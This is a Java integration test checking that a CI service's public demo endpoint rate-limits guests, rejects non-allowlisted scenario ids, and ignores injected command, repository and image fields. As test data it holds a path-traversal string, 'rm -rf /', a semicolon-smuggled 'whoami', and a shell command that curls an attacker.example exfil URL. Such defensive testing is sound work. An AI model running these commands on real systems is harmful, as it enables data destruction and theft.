package dev.forgeci.controlplane.demo;

import static org.assertj.core.api.Assertions.assertThat;

import dev.forgeci.controlplane.support.ControlPlaneIntegrationTest;
import java.nio.file.Path;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.core.ParameterizedTypeReference;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.DynamicPropertyRegistry;
import org.springframework.test.context.DynamicPropertySource;

/**
 * What an unauthenticated visitor can and cannot make the public endpoints do
 * (product-and-demo.md#public-demo-safety): only an allowlisted scenario id against the fixed
 * bundled repo, rate-limited per client, with no way to smuggle a command, a repository, or an
 * image into what actually runs.
 */
class PublicDemoSecurityIntegrationTest extends ControlPlaneIntegrationTest {

    @TempDir static Path demoWorkspace;

    @DynamicPropertySource
    static void demoProperties(DynamicPropertyRegistry registry) {
        registry.add("forge.demo.repo-path", () -> "../../demo/sample-monorepo");
        registry.add("forge.demo.workspace-path", () -> demoWorkspace.toString());
        registry.add("forge.demo.warmup.enabled", () -> "false");
    }

    private static final ParameterizedTypeReference<Map<String, Object>> JSON_OBJECT =
            new ParameterizedTypeReference<>() {};

    @Autowired private TestRestTemplate rest;
    @Autowired private StringRedisTemplate redis;

    /**
     * Every request in this class arrives from the same loopback address and so shares one rate
     * limit bucket and the one global build slot. Both are cleared between tests — in production
     * their TTLs do this, just far more slowly than a test can wait for.
     */
    @BeforeEach
    void clearGuestLimits() {
        redis.delete("forge:demo:build-lock");
        redis.keys("forge:demo:rate:*").forEach(redis::delete);
    }

    @Test
    void aSecondGuestBuildFromTheSameClientInsideTheWindowIsRateLimited() {
        assertThat(
                        startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2))
                                .getStatusCode())
                .isEqualTo(HttpStatus.CREATED);
        redis.delete(
                "forge:demo:build-lock"); // isolate the rate limit from the one-build-at-a-time
        // lock

        ResponseEntity<Map<String, Object>> tooFast =
                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));

        assertThat(tooFast.getStatusCode()).isEqualTo(HttpStatus.TOO_MANY_REQUESTS);
        assertThat(tooFast.getBody()).containsEntry("error", "demo_busy");
    }

    @Test
    void aScenarioIdOutsideTheAllowlistIsRejected() {
        for (String forged :
                new String[] {
                    "../../etc/passwd", "rm -rf /", "custom-scenario", "no-change; whoami"
                }) {
            ResponseEntity<Map<String, Object>> response =
                    startDemoBuild(Map.of("scenario", forged, "workerCount", 1));

            assertThat(response.getStatusCode())
                    .as("scenario %s", forged)
                    .isEqualTo(HttpStatus.BAD_REQUEST);
            clearGuestLimits();
        }
    }

    @Test
    void aBlankScenarioIsRejectedBeforeAnythingRuns() {
        ResponseEntity<Map<String, Object>> response =
                startDemoBuild(Map.of("scenario", "", "workerCount", 1));

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
    }

    @Test
    void aGuestCannotSmuggleACommandRepositoryOrImageIntoTheBuildItStarts() {
        Map<String, Object> hostile =
                Map.of(
                        "scenario",
                        "leaf-module",
                        "workerCount",
                        2,
                        "command",
                        java.util.List.of("/bin/sh", "-c", "curl attacker.example/exfil"),
                        "repoUrl",
                        "git@github.com:attacker/payload.git",
                        "image",
                        "attacker/image:latest",
                        "tasks",
                        java.util.List.of("attacker:task"));

        ResponseEntity<Map<String, Object>> injected = startDemoBuild(hostile);
        assertThat(injected.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        Set<?> injectedTasks =
                Set.copyOf((java.util.List<?>) injected.getBody().get("baselineTasks"));

        clearGuestLimits();
        ResponseEntity<Map<String, Object>> clean =
                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
        Set<?> cleanTasks = Set.copyOf((java.util.List<?>) clean.getBody().get("baselineTasks"));

        // the extra fields have no binding target at all: the build is byte-for-byte the bundled
        // one
        assertThat(injectedTasks).isEqualTo(cleanTasks);
        assertThat(injectedTasks)
                .allSatisfy(task -> assertThat(task.toString()).doesNotContain("attacker"));
    }

    @Test
    void aGuestCannotCrashAWorkerOnABuildThatIsNotRunningAnything() {
        ResponseEntity<Map<String, Object>> started =
                startDemoBuild(Map.of("scenario", "leaf-module", "workerCount", 2));
        Number buildId = (Number) started.getBody().get("incrementalBuildId");

        // no worker is registered in this suite, so nothing is running and there is nothing to
        // crash
        ResponseEntity<Map<String, Object>> response =
                rest.exchange(
                        "/api/demo/builds/" + buildId + "/crash-worker",
                        HttpMethod.POST,
                        HttpEntity.EMPTY,
                        JSON_OBJECT);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CONFLICT);
    }

    private ResponseEntity<Map<String, Object>> startDemoBuild(Map<String, Object> body) {
        return rest.exchange(
                "/api/demo/builds", HttpMethod.POST, new HttpEntity<>(body), JSON_OBJECT);
    }
}
